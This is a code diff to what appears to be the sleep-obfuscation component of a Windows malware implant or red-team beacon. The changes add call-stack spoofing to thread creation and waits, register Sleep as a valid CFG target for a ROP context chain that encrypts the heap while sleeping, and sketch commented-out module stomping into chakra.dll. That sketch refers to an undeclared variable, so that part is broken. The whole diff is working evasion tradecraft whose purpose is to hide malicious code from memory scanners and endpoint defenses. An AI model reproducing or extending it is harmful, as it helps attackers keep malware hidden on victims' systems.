@@ -50,6 +50,7 @@ typedef struct {
     struct
     {
         D_API( WaitForSingleObjectEx );
+        D_API( Sleep );
 
     } k32;
     
@@ -63,6 +64,7 @@ typedef struct {
     HANDLE   hK32;
     HANDLE   hAdvapi;
     ULONG    szNtdll;
+    ULONG    szK32;
 
     PVOID    Buffer;
     ULONG    Length;
@@ -117,6 +119,7 @@ SECTION( D ) NTSTATUS setValidCallTargets( PAPI pApi, HANDLE module, LPVOID func
 SECTION( D ) VOID handleCFG( PAPI pApi )
 {
     setValidCallTargets( pApi, pApi->hK32, C_PTR( pApi->k32.WaitForSingleObjectEx ) );
+    setValidCallTargets( pApi, pApi->hK32, C_PTR( pApi->k32.Sleep ) );
     setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtContinue ) );
     setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtGetContextThread ) );
     setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtProtectVirtualMemory ) );
@@ -145,7 +148,7 @@ SECTION( D ) VOID initContexts( PAPI pApi, PCONTEXT* contexts )
 {
     PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
 
-    for( int i = 13; i >= 0; i-- )
+    for( int i = 12; i >= 0; i-- )
     {
         contexts[i] = ( PCONTEXT )C_PTR( SPOOF( pApi->ntdll.RtlAllocateHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, C_PTR( HEAP_ZERO_MEMORY ), C_PTR( sizeof( CONTEXT ) ) ) );
         if( i < 10 )
@@ -209,11 +212,12 @@ SECTION( D ) NTSTATUS createSleepThread( PAPI pApi, PHANDLE thread )
     PVOID    StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
     SIZE_T   StackSize = 0x01FFFFFF;
 
-    Status = pApi->ntdll.NtCreateThreadEx( thread, THREAD_ALL_ACCESS, NULL, ( HANDLE )-1, StartAddress, NULL, TRUE, 0, StackSize, StackSize, NULL );
+    Status = ( NTSTATUS ) SPOOF( pApi->ntdll.NtCreateThreadEx, pApi->hNtdll, pApi->szNtdll, thread, C_PTR( THREAD_ALL_ACCESS ), NULL, ( HANDLE )-1, StartAddress, NULL, C_PTR( TRUE ), C_PTR( 0 ), C_PTR( StackSize ), C_PTR( StackSize ), NULL );
 
     return Status;
 };
 
+// Obtain a true handle to our original thread and create a suspended wait thread
 SECTION( D ) NTSTATUS setupThreads( PAPI pApi, PHANDLE originalThd, PHANDLE sleepThd )
 {    
     NTSTATUS Status = STATUS_SUCCESS;
@@ -229,31 +233,50 @@ SECTION( D ) NTSTATUS setupThreads( PAPI pApi, PHANDLE originalThd, PHANDLE slee
     return Status;
 };
 
-SECTION( D ) VOID delayExec( PAPI pApi )
+SECTION( D ) VOID delayExec( PAPI pApi, PIMAGE_DOS_HEADER OverloadModule )
 {
     #define CHECKERR( status )  if( status != STATUS_SUCCESS ) { goto cleanup; };
 
-    NTSTATUS    Status  = 0;
-    HANDLE      SyncEvt = NULL;
-    HANDLE      WaitThd = NULL;
-    HANDLE      OrigThd = NULL;
-    ULONG       OldProt = 0;
-    PCONTEXT    Contexts[13]; // APC CTXs 0-9, Original CTX, Sleep CTX, Fake CTX
-    UCHAR       EmptyStk[256];
-    USTRING     S32Key;
-    USTRING     S32Data;
-    PVOID       Trampoline;
+    NTSTATUS                Status   = 0;
+    HANDLE                  SyncEvt  = NULL;
+    HANDLE                  WaitThd  = NULL;
+    HANDLE                  OrigThd  = NULL;
+    ULONG                   OldProt  = 0;
+    PCONTEXT                Contexts[13]; // APC CTXs 0-9, Original CTX, Sleep CTX, Fake CTX
+    UCHAR                   EmptyStk[256];
+    USTRING                 S32Key;
+    USTRING                 S32Data;
+    PVOID                   Trampoline;
+    PIMAGE_NT_HEADERS       Nt       = NULL;
+    PIMAGE_SECTION_HEADER   Sec      = NULL;
+    PVOID                   Text     = NULL;
+    DWORD                   TextSize = NULL;
+    
 
     RtlSecureZeroMemory( &Contexts, sizeof( Contexts ) );
     RtlSecureZeroMemory( &EmptyStk, sizeof( EmptyStk ) );
     
+    // CFG for APIs called in ROP
     handleCFG( pApi );
 
-    S32Key.len = S32Key.maxlen = KEY_SIZE;
-    S32Key.str = pApi->enckey;
+    S32Key.len  = S32Key.maxlen = KEY_SIZE;
+    S32Key.str  = pApi->enckey;
     S32Data.len = S32Data.maxlen = pApi->Length;
     S32Data.str = ( PBYTE )( pApi->Buffer );
 
+    // Prep the Module Stomp
+    // Nt  = (PIMAGE_NT_HEADERS)( U_PTR( OverloadModule ) + OverloadModule->e_lfanew );
+    // Sec = IMAGE_FIRST_SECTION(Nt);
+    // for ( DWORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ )
+    // {
+    //     if ( HashString( SecHeader[ i ].Name, 0 ) == H_SECTION_TEXT)
+    //     {
+    //         Text     = U_PTR( OverloadModule ) + SecHeader[ i ].VirtualAddress;
+    //         TextSize = SecHeader[ i ].Misc.VirtualSize;
+    //     }
+    // }
+
+    // Prep the Foliage
     Status = setupThreads( pApi, &OrigThd, &WaitThd );
     CHECKERR( Status );
     
@@ -302,10 +325,8 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     Contexts[c]->Rdx = U_PTR( Contexts[12] ); // Fake Context
 
     c--;
-    Contexts[c]->Rip = U_PTR( pApi->k32.WaitForSingleObjectEx );
-    Contexts[c]->Rcx = U_PTR( OrigThd );
-    Contexts[c]->Rdx = U_PTR( pApi->dwMilliseconds );
-    Contexts[c]->R8 = U_PTR( FALSE );
+    Contexts[c]->Rip = U_PTR( pApi->k32.Sleep );
+    Contexts[c]->Rcx = U_PTR( pApi->dwMilliseconds );
 
     c--;
     Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
@@ -397,7 +418,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
 
     pApi->hNtdll  = FindModule( H_LIB_NTDLL, Peb, &pApi->szNtdll );
     pApi->hAdvapi = FindModule( H_LIB_ADVAPI32, Peb, NULL );
-    pApi->hK32    = FindModule( H_LIB_KERNEL32, Peb, NULL );
+    pApi->hK32    = FindModule( H_LIB_KERNEL32, Peb, &pApi->szK32 );
     hKb           = FindModule( H_LIB_KERNELBASE, Peb, NULL );
 
     if( !pApi->hNtdll || !pApi->hK32 || !hKb )
@@ -434,6 +455,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
 
     pApi->kb.SetProcessValidCallTargets         = FindFunction( hKb, H_API_SETPROCESSVALIDCALLTARGETS );
     pApi->k32.WaitForSingleObjectEx             = FindFunction( pApi->hK32, H_API_WAITFORSINGLEOBJECTEX );
+    pApi->k32.Sleep             = FindFunction( pApi->hK32, H_API_SLEEP );
 
     if( !pApi->hAdvapi )
     {
@@ -467,7 +489,9 @@ SECTION( D ) VOID generateEncryptionKey( PAPI pApi )
 
 SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds ) 
 {
-    API Api;
+    API                 Api;
+    PVOID               OverloadModule;
+
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
 
     Api.CFG            = 0;
@@ -481,13 +505,21 @@ SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
         if( dwMilliseconds < 1000 )
         {
             // Don't waste cycles on the full chain for `sleep 0`
-            Api.k32.WaitForSingleObjectEx( ( HANDLE )-1, dwMilliseconds, FALSE );
+            SPOOF( Api.k32.WaitForSingleObjectEx, Api.hK32, Api.szK32,( HANDLE )-1, dwMilliseconds );
             return;
         };
 
+        OverloadModule = FindModule( HashString( OFFSET( L"chakra.dll" ), NULL ), NULL, NULL );
+        // if ( !OverloadModule )
+        // {
+        //     UNICODE_STRING      Uni = { 0 };
+        //     Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"chakra.dll" ) ) );
+        //     SPOOF( Api.ntdll.LdrLoadDll, Api.hNtdll, Api.szNtdll, NULL, 0, &Uni, &OverloadModule )
+        // }
+
         generateEncryptionKey( &Api );
         encryptHeap( &Api );
-        delayExec( &Api );
+        delayExec( &Api, OverloadModule );
         encryptHeap( &Api );
     };
 
